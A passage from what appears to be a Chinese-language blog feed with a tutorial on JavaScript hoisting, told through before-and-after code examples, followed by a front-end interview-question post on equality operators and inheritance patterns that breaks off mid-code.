        <content type="html"><![CDATA[<h2 id="首先了解一下规则"><a href="#首先了解一下规则" class="headerlink" title="首先了解一下规则"></a>首先了解一下规则</h2><p>1)函数声明会置顶 </p><p>2)变量声明也会置顶 </p><p>3)函数声明更优先 </p><p>4)变量和赋值语句一起书写，在js引擎解析时，会将其拆成声明和赋值2部分，声明置顶，赋值保留在原来位置 </p><p>5)声明过的变量不会重复声明 </p><h3 id="例子一"><a href="#例子一" class="headerlink" title="例子一"></a>例子一</h3><p>先来看一下结果</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> scope <span class="token operator">=</span> gloabl<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>scope<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> scope <span class="token operator">=</span> <span class="token string">"local"</span><span class="token punctuation">;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>scope<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//输出undefined，local</span></code></pre><p>按照规则改写顺序之后</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> scope <span class="token operator">=</span> gloabl<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> scope<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//声明提前</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>scope<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//输出undefined，不是gloabl</span>    scope <span class="token operator">=</span> <span class="token string">"local"</span>       <span class="token comment" spellcheck="true">//初始化</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>scope<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//输出local</span><span class="token punctuation">}</span></code></pre><h3 id="例子二"><a href="#例子二" class="headerlink" title="例子二"></a>例子二</h3><p>先来看一下结果</p><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token string">'fn'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//输出函数体，[]</span></code></pre><p>按照规则改写顺序之后</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//函数声明提前</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token string">'fn'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//不执行</span><span class="token punctuation">}</span><span class="token keyword">var</span> a<span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//变量声明提前，但是在函数后面</span><span class="token keyword">var</span> a<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//原本js内存地址中本来已经声明了一个名为a的函数对象                            （相当于已经将a这个地址指向了函数对象），再次声明一次                           a，但并没赋值，所以打印出来的依旧是函数a。</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//输出[]</span></code></pre><h3 id="例子三"><a href="#例子三" class="headerlink" title="例子三"></a>例子三</h3><p>先来看一下结果</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//这里a并没有提升为全局变量</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//输出1</span></code></pre><p>如果你不懂，我们来看看改写之后</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">//函数声明置顶</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//不执行</span>    <span class="token punctuation">}</span>    a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">//10赋值给了函数名为a的这个函数对象！</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">var</span> a<span class="token punctuation">;</span>a  <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//输出1</span></code></pre><p>如果把函数a注释掉</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">var</span> a<span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//输出10</span></code></pre><h3 id="例子四"><a href="#例子四" class="headerlink" title="例子四"></a>例子四</h3><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token string">'fn'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//输出函数体，"fn"，1，报错</span></code></pre><p>改写顺序</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token string">'fn'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">var</span> a<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//输出函数体</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//输出"fn"</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">//输出1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//报错</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//前面报错了，不执行了</span></code></pre><h3 id="例子五"><a href="#例子五" class="headerlink" title="例子五"></a>例子五</h3><pre class=" language-js"><code class="language-js"><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span>                      <span class="token comment" spellcheck="true">//输出undefined,3</span></code></pre><p>改写顺序</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">var</span> a<span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//输出undefined</span>    a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> b<span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//返回函数b</span><span class="token punctuation">}</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//相当于b()，输出3</span>a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></code></pre><h3 id="例子六"><a href="#例子六" class="headerlink" title="例子六"></a>例子六</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> num <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> num <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> fn2<span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>改写顺序</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> num <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">var</span> num<span class="token punctuation">;</span>    num <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> fn2<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> b<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//先执行fn1(),返回fn2,输出fn2的函数体</span>b <span class="token operator">=</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//b=fn2</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">//fn2(),输出10</span></code></pre><h3 id="例子七"><a href="#例子七" class="headerlink" title="例子七"></a>例子七</h3><pre class=" language-js"><code class="language-js"><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> fn <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token number">123</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> fn1<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出undefined,undefined,undefined,1,0,undefined,报错</span></code></pre><p>改写顺序</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> fn <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token number">123</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> a<span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>    a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//fn1=>console.log(a)=>undefined</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//fn1=>console.log(a)=>undefined</span>a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//undefined,1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//0</span><span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">//fn1()=>console.log(a)=>undefined,a()=>报错</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题（三）</title>
      <link href="2018/08/04/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>2018/08/04/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>== 和 === 的区别</li><li>讲讲 js 的继承方式</li><li>介绍一下箭头函数</li><li>this 的指向</li><li>简述CSS选择器的优先级规则</li><li>简述居中一个元素的方法</li><li>浏览器缓存和webpack缓存配置</li><li>meta标签与视口</li><li>margin 写3个值</li><li>background-size</li><li>浏览器标签页通信</li><li>cookie, localStorage, sessionStorage</li></ul><h2 id="和-的区别"><a href="#和-的区别" class="headerlink" title="== 和 === 的区别"></a>== 和 === 的区别</h2><blockquote><p>== 代表相同， ===代表严格相同</p><p>当进行双等号比较时候： 先检查两个操作数数据类型，如果相同， 则进行===比较， 如果不同， 则愿意为你进行一次类型转换， 转换成相同类型后再进行比较， 而===比较时， 如果类型不同，直接就是false.</p><p>null == undefined // true，是一种规定<br>null === undefined // false</p><p>typeof null // object<br>typeof undefined // undefined</p><p>[1] == [1] // false，地址不同</p><p>[1] == “1” //true，隐式类型转换</p></blockquote><h2 id="讲讲-js-的继承方式"><a href="#讲讲-js-的继承方式" class="headerlink" title="讲讲 js 的继承方式"></a>讲讲 js 的继承方式</h2><p><strong>（1）原型链继承：子类原型是对父类的实例化</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Father</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">Son</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>Son<span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Father</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//实例化对象会指向父类的原型，如图</span></code></pre><p><img src="http://lizhenchao.oss-cn-shenzhen.aliyuncs.com/imgs/public/16-11-11/5352248.jpg" alt="原型链继承"></p><p>缺点：</p><p>1.父类的共有属性会被子类实例共享</p><p>2.创建子类对象无法传参，因为只有Son.prototype = new Father()可以传，但是会对所有子类有效。</p><p><strong>（2）构造函数继承</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Father</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">Son</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">,</span>sex<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>    Father<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">var</span> son1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Son</span><span class="token punctuation">(</span><span class="token string">'张三'</span><span class="token punctuation">,</span><span class="token string">'30'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//简述new一个对象的过程</span><span class="token comment" spellcheck="true">//1.创造一个新的空对象</span><span class="token comment" spellcheck="true">//2.新对象的_proto_指向构造函数的原型对象</span><span class="token comment" spellcheck="true">//3.构造函数的this指向正在创建的新对象，并执行构造函数的代码，向新对象中添加属性和方法。</span><span class="token comment" spellcheck="true">//4.返回新对象地址</span><span class="token comment" spellcheck="true">//讲一下_proto_和prototype的区别</span><span class="token comment" spellcheck="true">//1.__proto__是 对象实例 都有的，而 prototype 是函数对象特有的</span><span class="token comment" spellcheck="true">//2.prototype 原型对象 有 constructor 属性，又指回 构造函数</span><span class="token comment" spellcheck="true">//3.对象实例的 __proto__ 均默认指向 它们的 构造函数的 prototype</span></code></pre><p>缺点： </p><p> 1.父类的原型方法不会被子类继承，如果全放到构造函数中，每个子类实例都单独拥有一份，违反复用性。</p><p> 2.不能通过 son instanceof Father</p><p><strong>（3）组合继承</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Father</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">Son</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">,</span>sex<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>    Father<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">}</span>Son<span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Father</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>缺点：父类的构造函数执行了两遍</p><p><strong>（4）原型式继承：对原型链继承的封装</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">inheritObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    F<span class="token punctuation">.</span>prototype <span class="token operator">=</span> o<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> book <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span><span class="token string">'js book'</span><span class="token punctuation">}</span><span class="token keyword">var</span> newBook <span class="token operator">=</span> <span class="token function">inheritObject</span><span class="token punctuation">(</span>book<span class="token punctuation">)</span><span class="token keyword">var</span> newBook<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'ajax book'</span></code></pre><p>缺点：仍存在原型链继承的缺点</p><p>优点：F中无内容，开销比较小。</p><p><strong>（5）寄生式继承：对原型继承的二次封装并进行了扩展</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> book <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span><span class="token string">'js book'</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">creteBook</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token function">inheritObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//不仅有父类中的属性和方法</span>    <span class="token comment" spellcheck="true">//扩展新对象</span>    o<span class="token punctuation">.</span>getName <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//还添加了新的属性和方法</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> o<span class="token punctuation">}</span></code></pre><p>缺点：方法在函数中定义，无法得到复用</p><p><strong>（6）寄生组合继承（最理想）</strong></p><p>组合继承= 原型链继承 + 构造函数继承</p><p>寄生组合式继承=寄生式继承+构造函数继承</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">inheritObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    F<span class="token punctuation">.</span>prototype <span class="token operator">=</span> o<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">inheritPrototype</span><span class="token punctuation">(</span>subClass<span class="token punctuation">,</span>superClass<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token function">inheritObject</span><span class="token punctuation">(</span>superClass<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>constructor <span class="token operator">=</span> subClass    subClass<span class="token 